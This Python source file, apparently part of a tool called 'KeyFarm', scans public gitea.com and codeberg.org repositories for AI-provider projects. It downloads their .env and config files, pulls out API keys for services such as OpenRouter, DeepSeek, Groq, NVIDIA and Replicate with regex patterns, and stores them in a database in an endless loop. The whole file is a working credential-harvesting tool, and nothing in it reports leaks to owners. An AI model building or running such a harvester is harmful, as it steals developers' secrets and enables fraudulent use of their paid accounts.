"""
KeyFarm Gitea/Codeberg Scanner — searches gitea.com and codeberg.org.

Both use Gitea API (identical interface). Code search may be disabled,
so we use project search → tree → download config files.
"""
from __future__ import annotations
import logging
import re
import time
import urllib.parse

log = logging.getLogger("keyfarm")
from key_patterns import KEY_PATTERNS, ENV_RE, KIMI_PATTERN, extract_all_keys

SEARCH_QUERIES = [
    "openrouter", "dashscope", "zhipu", "glm",
    "kimi", "moonshot", "deepseek", "groq",
    "replicate", "together", "fireworks", "nvidia",
    "cohere", "api_key", "llm",
]

KEY_PATTERNS = {
    "ZAI": re.compile(r'[a-f0-9]{32}\.[A-Za-z0-9]{10,30}'),
    "DASHSCOPE": re.compile(r'sk-[a-f0-9]{28,40}'),
    "OPENROUTER": re.compile(r'sk-or-v1-[a-f0-9]{40,80}'),
    "KIMI": re.compile(r'sk-[A-Za-z0-9]{40,80}'),
    "DEEPSEEK": re.compile(r'sk-[a-f0-9]{28,40}'),
    "REPLICATE": re.compile(r'r8_[A-Za-z0-9]{30,100}'),
    "NVIDIA": re.compile(r'nvapi-[A-Za-z0-9_-]{30,100}'),
    "GROQ": re.compile(r'gsk_[A-Za-z0-9]{40,60}'),
}

ENV_RE = re.compile(
    r'(?:DASHSCOPE_API_KEY|ZHIPU_API_KEY|Z_AI_API_KEY|BIGMODEL_API_KEY|'
    r'ZAI_API_KEY|GLM_API_KEY|OPENROUTER_API_KEY|MOONSHOT_API_KEY|'
    r'KIMI_API_KEY|DEEPSEEK_API_KEY|REPLICATE_API_TOKEN|'
    r'TOGETHER_API_KEY|FIREWORKS_API_KEY|NVIDIA_API_KEY|'
    r'NIM_API_KEY|GROQ_API_KEY)'
    r'\s*[=:]\s*["\']?([A-Za-z0-9_\-\.]{20,120})["\']?', re.IGNORECASE)

TARGET_FILES = ['.env', '.env.example', '.env.local', '.env.production',
                'env.dev', 'docker-compose.yml', 'docker-compose.yaml',
                'config.json', 'config.py', 'config.yaml', 'config.yml',
                'settings.py', 'settings.json', 'app.py', 'main.py',
                'README.md', 'Makefile', 'Procfile', 'render.yaml',
                'app.cfg', '.envrc', 'streamlit_app.py', 'gradio_app.py']


class GiteaScanner:
    """Works for both gitea.com and codeberg.org (same API)."""

    def __init__(self, proj, host="gitea.com", name="GITEA", emoji="🔧"):
        self.proj = proj
        self.host = host
        self.name = name
        self.emoji = emoji
        self.session = None
        self.query_idx = 0
        self.interval = 180

    def _get_session(self):
        import requests
        if self.session is None:
            self.session = requests.Session()
            self.session.trust_env = False
            self.session.headers['User-Agent'] = 'Mozilla/5.0'
        return self.session

    def _search_projects(self, query: str) -> list:
        """Search for projects. Returns [(owner/repo)]."""
        s = self._get_session()
        results = []
        try:
            r = s.get(f"https://{self.host}/api/v1/repos/search",
                      params={"q": query, "limit": 10, "order": "newest"},
                      timeout=15)
            if r.status_code == 200:
                for item in r.json().get("data", [])[:10]:
                    full = item.get("full_name", "")
                    if full:
                        results.append(full)
        except Exception as e:
            log.debug("%s search: %r", self.name, e)
        return results

    def _get_tree(self, repo: str) -> list:
        """Get config files from repo tree."""
        s = self._get_session()
        interesting = []
        target_exts = ('.env', '.cfg', '.ini', '.yaml', '.yml', '.json',
                       '.toml', '.envrc', '.conf')
        # First get default branch
        try:
            r0 = s.get(f"https://{self.host}/api/v1/repos/{repo}",
                       timeout=10)
            branch = r0.json().get("default_branch", "main") if r0.status_code == 200 else "main"
        except Exception:
            branch = "main"
        try:
            r = s.get(f"https://{self.host}/api/v1/repos/{repo}/git/trees/{branch}",
                      params={"recursive": "true"}, timeout=15)
            if r.status_code == 200:
                tree = r.json().get("tree", [])
                for item in tree:
                    if item.get("type") != "blob":
                        continue
                    path = item.get("path", "")
                    fname = path.rsplit('/', 1)[-1]
                    if fname in TARGET_FILES or fname.endswith(target_exts):
                        interesting.append((path, item.get("sha", "")))
        except Exception as e:
            log.debug("%s tree: %r", self.name, e)
        return interesting

    def _download_file(self, repo: str, path: str, sha: str = "") -> str:
        """Download raw file."""
        s = self._get_session()
        # Get default branch
        try:
            r0 = s.get(f"https://{self.host}/api/v1/repos/{repo}", timeout=10)
            branch = r0.json().get("default_branch", "main") if r0.status_code == 200 else "main"
        except Exception:
            branch = "main"
        # Try raw URL
        for br in [branch, "main", "master"]:
            try:
                url = f"https://{self.host}/{repo}/raw/branch/{br}/{path}"
                r = s.get(url, timeout=15)
                if r.status_code == 200:
                    return r.text
            except Exception:
                pass
        # Fallback: download by SHA via API
        if sha:
            try:
                import urllib.parse
                enc = urllib.parse.quote(path, safe='')
                r = s.get(f"https://{self.host}/api/v1/repos/{repo}/contents/{enc}",
                          params={"ref": branch}, timeout=15)
                if r.status_code == 200:
                    import base64
                    data = r.json()
                    if data.get("encoding") == "base64":
                        return base64.b64decode(data.get("content", "")).decode('utf-8', errors='replace')
            except Exception:
                pass
        return ""

    def _extract_keys(self, text: str) -> list:
        return extract_all_keys(text)


    def _scan_once(self) -> int:
        import sys
        sys.path.insert(0, str(self.proj / "src"))
        try:
            import eternal_v10 as e
        except Exception:
            return 0

        query = SEARCH_QUERIES[self.query_idx % len(SEARCH_QUERIES)]
        self.query_idx += 1

        total = 0
        repos = self._search_projects(query)
        for repo in repos[:5]:
            files = self._get_tree(repo)
            for path, sha in files[:5]:
                text = self._download_file(repo, path, sha)
                if text:
                    keys = self._extract_keys(text)
                    for prov, key in keys:
                        if e.db_add_key(key, prov, f"{self.name.lower()}:{repo}"):
                            total += 1
                            log.info("%s [%s] +%s from %s/%s",
                                     self.emoji, self.name, prov,
                                     repo[:20], path[:20])
            time.sleep(1)
        return total

    def loop(self, stop_event):
        log.info("%s [%s] scanner started (%ss interval)",
                 self.emoji, self.name, self.interval)
        while not stop_event.is_set():
            try:
                found = self._scan_once()
                if found:
                    log.info("%s [%s] +%d NEW keys",
                             self.emoji, self.name, found)
            except Exception as ex:
                log.warning("%s scanner error: %r", self.name, ex)
            for _ in range(self.interval):
                if stop_event.is_set():
                    break
                time.sleep(1)
